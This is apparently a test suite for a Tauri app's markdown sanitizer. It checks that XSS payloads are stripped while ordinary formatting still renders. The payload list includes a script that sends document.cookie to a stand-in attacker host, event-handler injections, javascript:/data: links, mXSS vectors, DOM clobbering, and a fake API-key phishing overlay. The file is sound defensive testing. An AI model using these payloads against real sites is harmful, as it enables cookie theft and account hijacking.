import { beforeAll, describe, expect, test } from 'bun:test';
import { JSDOM } from 'jsdom';

// DOMPurify needs a DOM at import time
let renderMarkdown: (s: string) => string;

beforeAll(async () => {
  const dom = new JSDOM('');
  Object.assign(globalThis, { window: dom.window, document: dom.window.document });
  ({ renderMarkdown } = await import('../src/lib/markdown'));
});

/** Parses the rendered output the way the browser will. */
function dom(html: string) {
  const d = new JSDOM(`<body>${html}</body>`);
  return d.window.document.body;
}

const ATTACKS: [string, string][] = [
  ['script tag', '<script>fetch("https://evil.example/?"+document.cookie)</script>'],
  ['img onerror', '<img src=x onerror="alert(1)">'],
  ['svg onload', '<svg onload=alert(1)>'],
  ['iframe', '<iframe src="https://evil.example"></iframe>'],
  ['javascript: link (html)', '<a href="javascript:alert(1)">click</a>'],
  ['javascript: link (markdown)', '[click](javascript:alert(1))'],
  ['obfuscated javascript: link', '[x](jav&#x09;ascript:alert(1))'],
  ['data: link', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
  ['vbscript: link', '[x](vbscript:msgbox(1))'],
  ['form with submit', '<form action="https://evil.example"><input name=p><button>Go</button></form>'],
  ['inline event handler', '<p onmouseover="alert(1)">hover</p>'],
  ['style attribute', '<p style="position:fixed;inset:0;background:#000">x</p>'],
  ['style tag', '<style>body{display:none}</style>'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
  ['base hijack', '<base href="https://evil.example/">'],
  ['object/embed', '<object data="https://evil.example"></object><embed src="https://evil.example">'],
  ['math/mXSS', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
  ['nested mXSS', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ['tracking pixel (markdown)', '![](https://evil.example/pixel.png?leak=secret)'],
  ['tracking pixel (html)', '<img src="https://evil.example/pixel.png">'],
  ['dom clobbering', '<a id="__TAURI_INTERNALS__"></a><form name="document"></form>'],
  ['autofocus', '<div autofocus tabindex=0 onfocus=alert(1)>x</div>']
];

describe('hostile markdown cannot execute, load, or submit anything', () => {
  for (const [name, payload] of ATTACKS) {
    test(name, () => {
      const html = renderMarkdown(payload);
      const body = dom(html);

      expect(body.querySelector('script, style, iframe, frame, object, embed, svg, math, form, input, button, img, link, meta, base')).toBeNull();

      for (const el of body.querySelectorAll('*')) {
        for (const attr of el.getAttributeNames()) {
          expect(attr.startsWith('on'), `${attr} on <${el.tagName}>`).toBe(false);
        }
        expect(el.hasAttribute('style')).toBe(false);
        expect(el.hasAttribute('id')).toBe(false);
        expect(el.hasAttribute('name')).toBe(false);
        expect(el.hasAttribute('src')).toBe(false);
      }
      for (const a of body.querySelectorAll('a[href]')) {
        expect(a.getAttribute('href')!).toMatch(/^(https?:|mailto:)/i);
      }
      // No attribute anywhere may carry a script/data URL. (The text "javascript:" can still
      // appear as harmless visible text, e.g. when raw HTML is shown literally.)
      for (const el of body.querySelectorAll('*')) {
        for (const attr of el.getAttributeNames()) {
          expect(el.getAttribute(attr)!.replace(/\s/g, '')).not.toMatch(/^(javascript|vbscript|data):/i);
        }
      }
    });
  }
});

describe('fake UI overlays', () => {
  test('Tailwind classes in injected markup are removed', () => {
    const html = renderMarkdown(
      '<div class="fixed inset-0 z-[100] bg-black flex items-center justify-center">' +
        '<div class="bg-white p-6">Session expired. Enter your API key: <b>...</b></div></div>'
    );
    expect(html).not.toMatch(/class="[^"]*(fixed|inset-0|z-\[100\]|bg-black)/);
    expect(dom(html).querySelector('[class*="fixed"]')).toBeNull();
  });

  test('only highlight.js classes survive on code blocks', () => {
    const html = renderMarkdown('```js\nconst a = 1;\n```');
    expect(html).toContain('class="hljs language-js"');
    expect(html).toContain('hljs-keyword');
  });

  test('raw HTML is shown as text, not rendered', () => {
    const html = renderMarkdown('hello <b onclick="x()">world</b>');
    expect(dom(html).querySelector('b')).toBeNull();
    expect(dom(html).textContent).toContain('<b onclick="x()">world</b>');
  });
});

describe('legitimate content still works', () => {
  test('basic formatting', () => {
    const body = dom(renderMarkdown('**bold** and _italic_ and `code`\n\n- one\n- two\n\n1. a\n2. b'));
    expect(body.querySelector('strong')?.textContent).toBe('bold');
    expect(body.querySelector('em')?.textContent).toBe('italic');
    expect(body.querySelectorAll('ul li').length).toBe(2);
    expect(body.querySelectorAll('ol li').length).toBe(2);
  });

  test('tables', () => {
    const body = dom(renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |'));
    expect(body.querySelectorAll('th').length).toBe(2);
    expect(body.querySelectorAll('td').length).toBe(2);
  });

  test('<br> inside a table cell is kept', () => {
    const body = dom(renderMarkdown('| a |\n|---|\n| line1<br>line2 |'));
    expect(body.querySelector('td br')).not.toBeNull();
  });

  test('links are safe: noopener, show their destination, no target', () => {
    const a = dom(renderMarkdown('[docs](https://example.com/page?q=1)')).querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://example.com/page?q=1');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer nofollow');
    expect(a.getAttribute('title')).toBe('https://example.com/page?q=1');
    expect(a.hasAttribute('target')).toBe(false);
  });

  test('mailto links are allowed', () => {
    const a = dom(renderMarkdown('[mail](mailto:someone@example.com)')).querySelector('a')!;
    expect(a.getAttribute('href')).toBe('mailto:someone@example.com');
  });

  test('code containing HTML is displayed, not interpreted', () => {
    const body = dom(renderMarkdown('```html\n<script>alert(1)</script>\n```'));
    expect(body.querySelector('script')).toBeNull();
    expect(body.textContent).toContain('<script>alert(1)</script>');
  });

  test('non-ASCII text survives', () => {
    expect(renderMarkdown('Xin chào **thế giới** ệ')).toContain('Xin chào');
  });
});
